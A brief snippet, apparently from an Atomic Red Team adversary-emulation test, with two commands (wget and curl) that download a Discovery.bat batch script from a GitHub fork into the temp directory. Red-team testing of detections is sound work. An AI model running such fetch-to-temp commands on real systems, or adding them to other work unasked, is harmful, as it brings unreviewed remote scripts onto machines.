...
wget https://raw.githubusercontent.com/cvt111/atomic-red-team/master/ARTifacts/Misc/Discovery.bat -OutFile $temp\1.bat

# Alternate Ending: Using curl

curl https://raw.githubusercontent.com/cvt111/atomic-red-team/master/ARTifacts/Misc/Discovery.bat -OutFile $temp\2.bat
